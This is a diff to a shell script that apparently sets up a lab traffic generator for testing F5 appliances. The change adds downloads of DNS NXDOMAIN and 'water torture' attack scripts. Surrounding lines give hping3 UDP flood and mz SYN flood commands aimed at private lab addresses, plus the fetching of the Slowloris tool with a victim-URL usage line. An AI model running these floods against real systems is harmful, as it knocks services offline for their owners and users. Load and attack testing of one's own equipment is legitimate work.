@@ -19,8 +19,8 @@ echo "
                             |_|                                             |___|
 
 \r\n \r\n
-Version:  0.0.8                             \r\n
-Last Updated:  4/18/2018
+Version:  0.0.9                             \r\n
+Last Updated:  4/19/2018
 \r\n \r\n
 Updating system first..."
 sudo -E apt-get update
@@ -29,10 +29,15 @@ sudo -E apt-get upgrade -y
 wait
 echo "Downloading required dependencies...\r\n\r\n"
 #--------------------------------------------------------------------------------------------
-rm gen_data.sh
-wget https://raw.githubusercontent.com/c2theg/Vendor_code/master/F5/syslog-ng/gen_data.sh
-chmod u+x gen_data.sh
+rm gen_data.sh attack_dns_nxdomain.py attack_dns_watertorture_wget.sh
 
+wget https://raw.githubusercontent.com/c2theg/Vendor_code/master/F5/syslog-ng/gen_data.sh
+wget https://raw.githubusercontent.com/c2theg/Vendor_code/master/F5/syslog-ng/attack_dns_nxdomain.py
+wget https://raw.githubusercontent.com/c2theg/Vendor_code/master/F5/syslog-ng/attack_dns_watertorture_wget.sh
+
+chmod u+x gen_data.sh
+chmod u+x attack_dns_nxdomain.py
+chmod u+x attack_dns_watertorture_wget.sh
 
 #-- Install DNS-Perf --
 # https://www.nominum.com/measurement-tools/
@@ -71,6 +76,8 @@ hping3 10.1.1.13 -I eth0 --udp -p 53 --i u1000  \r\n
 
 \r\n \r\n
 "
+
+
 
 
 #---------- SADDAM
@@ -119,6 +126,10 @@ mz eth0 -c 0 -Q 50,100 -A rand -B 10.5.5.0/25 -t tcp \"flags=syn, dp=1-1023\"
 \r\n \r\n
 "
 
+#---- Python ---
+pip install dnspython
+
+
 
 #--- Slowloris
 echo "\r\n \r\n Downloading Slowloris... \r\n "
@@ -126,7 +137,7 @@ echo "\r\n \r\n Downloading Slowloris... \r\n "
 sudo apt-get -y install perl libwww-mechanize-shell-perl perl-mechanize
 wget https://raw.githubusercontent.com/llaera/slowloris.pl/master/slowloris.pl && chmod u+x slowloris.pl
 
-./slowloris.pl
+#./slowloris.pl
 echo "
 Usage: \r\n
 perl slowloris.pl -dns (Victim URL or IP) -options \r\n
